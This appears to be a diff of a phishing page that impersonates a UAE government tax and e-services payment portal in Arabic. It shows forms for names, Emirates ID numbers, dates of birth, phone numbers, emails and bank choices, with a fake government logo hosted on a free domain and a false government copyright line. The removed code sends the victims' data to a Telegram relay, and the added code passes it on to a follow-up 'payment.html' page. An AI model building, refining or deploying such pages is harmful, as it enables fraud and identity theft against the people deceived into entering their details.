@@ -1,179 +1,82 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>بوابة دفع قيمة الخدمات الإلكترونية</title>
-  <style>
-    :root{--primary:#1b6b3a;--accent:#c15c37;--bg:#fdfdfd}
-    *{box-sizing:border-box}
-    body{font-family:Tahoma, Arial, sans-serif;background:var(--bg);margin:0;padding:0;color:#111;line-height:1.4}
-    .wrap{max-width:720px;margin:16px auto;padding:18px}
-    .card{background:#fff;border-radius:8px;padding:18px;box-shadow:0 4px 12px rgba(0,0,0,.06);direction:rtl}
-    .gov-logo{display:flex;flex-direction:column;align-items:center;gap:8px;margin-bottom:8px}
-    .title{font-weight:700;color:var(--primary);text-align:center;font-size:20px;margin:6px 0}
-    .subtitle{font-size:13px;text-align:center;color:#666;margin-bottom:16px}
-    label.field{display:block;font-weight:600;margin-bottom:6px}
-    input[type="text"], input[type="tel"], input[type="number"], textarea{
-      width:100%;padding:12px;border:2px solid #ddd;border-radius:6px;font-size:15px;margin-bottom:12px
-    }
-    .select-bank-btn{
-      width:100%;padding:12px;border:2px solid #ddd;border-radius:6px;background:#fff;text-align:right;cursor:pointer
-    }
-    .amount-row{display:flex;gap:10px;align-items:center}
-    .amount-row input{flex:1}
-    .note{font-size:13px;color:#444;margin-top:6px}
-    .submit-btn{width:100%;background:var(--primary);color:#fff;border:none;padding:12px;border-radius:6px;font-weight:700;cursor:pointer;margin-top:10px}
-    .submit-btn:active{transform:translateY(1px)}
-    /* bank modal/list */
-    .bank-list {
-      max-height:320px; overflow:auto; padding:8px; border:1px solid #e6e6e6; border-radius:6px; margin-bottom:12px;
-      background:#fff;
-    }
-    .bank-item{display:flex;align-items:center;gap:12px;padding:10px;border-bottom:1px solid #f0f0f0}
-    .bank-item:last-child{border-bottom:0}
-    .bank-item input{width:18px;height:18px}
-    .bank-name{font-size:15px}
-    /* responsive smaller screens like your screenshot */
-    @media (max-width:420px){
-      .card{padding:12px}
-      .title{font-size:18px}
-      .bank-list{max-height:420px}
-    }
-    .footer{
-      margin-top:18px;padding-top:12px;border-top:1px solid #eee;font-size:12px;color:#777;text-align:center
-    }
-    .error{color:#b00020;font-size:13px;margin-bottom:8px}
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة دفع ضريبة القيمة المضافة</title>
+    <style>
+        body{font-family:Arial,Helvetica,sans-serif;background:#f3f6f9;margin:0;padding:20px;box-sizing:border-box}
+        .container{max-width:420px;margin:30px auto}
+        .card{padding:20px;border-radius:12px;background:#fff;box-shadow:0 4px 10px rgba(0,0,0,0.08)}
+        .logo{max-width:220px;display:block;margin:0 auto 12px}
+        h1{text-align:center;margin:6px 0 12px}
+        input,select{width:100%;padding:12px;border-radius:8px;border:1px solid #e6e9ee;margin-bottom:12px;box-sizing:border-box}
+        .dob{display:flex;gap:8px}
+        .dob input{flex:1}
+        button{width:100%;padding:12px;background:#0b61c2;color:#fff;border:0;border-radius:8px;font-weight:700;cursor:pointer}
+        .note{font-size:13px;color:#666;text-align:center;margin-top:10px}
+    </style>
 </head>
 <body>
-  <div class="wrap">
-    <div class="card" role="main" aria-labelledby="pageTitle">
-      <div class="gov-logo">
-        <!-- ضع شعار هنا إن أردت -->
-        <img src="" alt="" style="max-width:120px;display:none">
-      </div>
+    <div class="container">
+        <div class="card">
+            <img src="https://tonfree.serv00.net/sadUae/index-files/government-ae-logo-arabic.png" alt="شعار" class="logo">
+            <h1>بوابة دفع ضريبة القيمة المضافة</h1>
 
-      <h1 id="pageTitle" class="title">بوابة دفع قيمة الخدمات الإلكترونية</h1>
-      <div class="subtitle">حكومة الإمارات العربية المتحدة</div>
+            <form id="personalForm" autocomplete="off">
+                <input id="fullName" type="text" placeholder="الاسم الكامل" required>
+                <select id="idType" required>
+                    <option value="">اختر نوع الهوية</option>
+                    <option value="هوية اماراتية">الهوية الإماراتية</option>
+                    <option value="جواز سفر">جواز السفر</option>
+                </select>
 
-      <form id="paymentForm" novalidate>
-        <div>
-          <label class="field" for="fullName">الاسم بالكامل *</label>
-          <input id="fullName" name="fullName" type="text" placeholder="الاسم كما في الهوية" required />
+                <label style="display:block;margin-bottom:6px;font-weight:600">تاريخ الميلاد (ميلادي)</label>
+                <div class="dob">
+                    <input id="day" type="number" placeholder="يوم" min="1" max="31" required>
+                    <input id="month" type="number" placeholder="شهر" min="1" max="12" required>
+                    <input id="year" type="number" placeholder="سنة" min="1900" max="2100" required>
+                </div>
+
+                <input id="phone" type="tel" placeholder="رقم الجوال" required>
+                <input id="email" type="email" placeholder="البريد الإلكتروني" required>
+
+                <button type="submit">التالي</button>
+            </form>
+
+            <p class="note">سيتم نقل بياناتك إلى صفحة الدفع التالية لأكمال العملية (تجريبي).</p>
         </div>
-
-        <div>
-          <label class="field" for="idNumber">رقم الهوية *</label>
-          <input id="idNumber" name="idNumber" type="text" placeholder="مثال: 784-XXXXXX-XX-X" required />
-        </div>
-
-        <div>
-          <label class="field" for="mobile">رقم الجوال *</label>
-          <input id="mobile" name="mobile" type="tel" placeholder="مثال: 05XXXXXXXX" required />
-        </div>
-
-        <div>
-          <label class="field">ادخل البنك الخاص بك *</label>
-          <div class="bank-list" id="bankList" role="listbox" aria-label="قائمة البنوك">
-            <!-- كل البنوك كـ radio -->
-            <label class="bank-item"><input type="radio" name="bank" value="بنك أبوظبي الأول" required /><span class="bank-name">بنك أبوظبي الأول</span></label>
-            <label class="bank-item"><input type="radio" name="bank" value="مصرف ابوظبي الاسلامي" /><span class="bank-name">مصرف أبوظبي الإسلامي</span></label>
-            <label class="bank-item"><input type="radio" name="bank" value="بنك دبي الاسلامي" /><span class="bank-name">بنك دبي الإسلامي</span></label>
-            <label class="bank-item"><input type="radio" name="bank" value="بنك الامارات الاسلامي" /><span class="bank-name">بنك الإمارات الإسلامي</span></label>
-            <label class="bank-item"><input type="radio" name="bank" value="بنك ابوظبي التجاري" /><span class="bank-name">بنك أبوظبي التجاري</span></label>
-            <label class="bank-item"><input type="radio" name="bank" value="بنك دبي التجاري" /><span class="bank-name">بنك دبي التجاري</span></label>
-            <label class="bank-item"><input type="radio" name="bank" value="الاتحاد الوطني" /><span class="bank-name">بنك الإمارات دبي الوطني</span></label>
-            <label class="bank-item"><input type="radio" name="bank" value="بنك الشارقة الاسلامي" /><span class="bank-name">مصرف الشارقة الإسلامي</span></label>
-            <label class="bank-item"><input type="radio" name="bank" value="بنك المشرق" /><span class="bank-name">بنك المشرق</span></label>
-            <label class="bank-item"><input type="radio" name="bank" value="بنك الفجيرة الوطني" /><span class="bank-name">بنك الفجيرة الوطني</span></label>
-            <label class="bank-item"><input type="radio" name="bank" value="بنك رأس الخيمة" /><span class="bank-name">بنك رأس الخيمة</span></label>
-            <label class="bank-item"><input type="radio" name="bank" value="البنك التجاري الدولي" /><span class="bank-name">البنك التجاري الدولي</span></label>
-            <label class="bank-item"><input type="radio" name="bank" value="بنك عجمان" /><span class="bank-name">بنك عجمان</span></label>
-            <label class="bank-item"><input type="radio" name="bank" value="HSBC" /><span class="bank-name">بنك HSBC</span></label>
-            <label class="bank-item"><input type="radio" name="bank" value="LIV" /><span class="bank-name">بنك LIV</span></label>
-            <label class="bank-item"><input type="radio" name="bank" value="بنك المصرف" /><span class="bank-name">بنك المصرف</span></label>
-            <label class="bank-item"><input type="radio" name="bank" value="ستاندرد تشارترد" /><span class="bank-name">بنك ستاندرد تشارترد</span></label>
-            <label class="bank-item"><input type="radio" name="bank" value="بنك الهلال" /><span class="bank-name">بنك الهلال</span></label>
-            <label class="bank-item"><input type="radio" name="bank" value="بنك المشرق الاسلامي" /><span class="bank-name">بنك المشرق الإسلامي</span></label>
-            <!-- يمكنك إضافة بنوك إضافية بنفس الصيغة -->
-          </div>
-        </div>
-
-        <div>
-          <label class="field" for="amount">قيمة رسوم السداد (درهم إماراتي) *</label>
-          <input id="amount" name="amount" type="number" min="0" step="0.01" placeholder="مثال: 100.00" required />
-        </div>
-
-        <div class="error" id="error" aria-live="assertive" style="display:none"></div>
-
-        <button class="submit-btn" type="submit">المتابعة</button>
-      </form>
-
-      <div class="footer">
-        حقوق النشر © حكومة الإمارات 2025 — معايير WCAG 2.0 AAA
-      </div>
     </div>
-  </div>
 
-  <script>
-    (function(){
-      const form = document.getElementById('paymentForm');
-      const errorEl = document.getElementById('error');
+<script>
+document.getElementById('personalForm').addEventListener('submit', function(e){
+    e.preventDefault();
 
-      function showError(msg){
-        errorEl.style.display = 'block';
-        errorEl.textContent = msg;
-      }
-      function hideError(){
-        errorEl.style.display = 'none';
-        errorEl.textContent = '';
-      }
+    const fullName = document.getElementById('fullName').value.trim();
+    const idType = document.getElementById('idType').value;
+    const day = document.getElementById('day').value;
+    const month = document.getElementById('month').value;
+    const year = document.getElementById('year').value;
+    const phone = document.getElementById('phone').value.trim();
+    const email = document.getElementById('email').value.trim();
 
-      form.addEventListener('submit', async function(e){
-        e.preventDefault();
-        hideError();
+    if(!fullName || !idType || !day || !month || !year || !phone || !email){
+        alert('الرجاء ملء كافة الحقول المطلوبة.');
+        return;
+    }
 
-        const fullName = document.getElementById('fullName').value.trim();
-        const idNumber = document.getElementById('idNumber').value.trim();
-        const mobile = document.getElementById('mobile').value.trim();
-        const amount = document.getElementById('amount').value.trim();
+    // خزن البيانات مؤقتًا في sessionStorage لصفحة الدفع التالية
+    const data = {
+        fullName, idType,
+        birth: `${day}/${month}/${year}`,
+        phone, email,
+        amount: "10 AED"
+    };
+    sessionStorage.setItem('taxPaymentData', JSON.stringify(data));
 
-        // اختر البنك
-        const bankRadio = document.querySelector('input[name="bank"]:checked');
-        const bank = bankRadio ? bankRadio.value : '';
-
-        // تحقق بسيط
-        if (!fullName) return showError('الرجاء إدخال الاسم الكامل.');
-        if (!idNumber) return showError('الرجاء إدخال رقم الهوية.');
-        if (!mobile) return showError('الرجاء إدخال رقم الجوال.');
-        if (!bank) return showError('الرجاء اختيار البنك.');
-        if (!amount || isNaN(amount) || Number(amount) <= 0) return showError('الرجاء إدخال قيمة صحيحة للرسوم.');
-
-        // مجهز payload للإرسال للخادم
-        const payload = { fullName, idNumber, mobile, bank, amount };
-
-        try {
-          // توجه POST إلى نهاية خادمية. السيرفر هو المسؤول عن إرسال الرسالة لتليجرام باستخدام توكن آمن.
-          const resp = await fetch('/api/send-telegram', {
-            method: 'POST',
-            headers: {'Content-Type':'application/json'},
-            body: JSON.stringify(payload)
-          });
-
-          if (!resp.ok) {
-            const text = await resp.text();
-            throw new Error(text || 'خطأ من الخادم');
-          }
-
-          // سلوك ما بعد النجاح — إعادة توجيه كما في تصميمك
-          window.location.href = 'payment.html';
-        } catch (err) {
-          showError('فشل إرسال البيانات. حاول لاحقاً. (' + (err.message || '') + ')');
-          console.error(err);
-        }
-      });
-    })();
-  </script>
+    // انتقل إلى صفحة الدفع
+    window.location.href = 'payment.html';
+});
+</script>
 </body>
 </html>
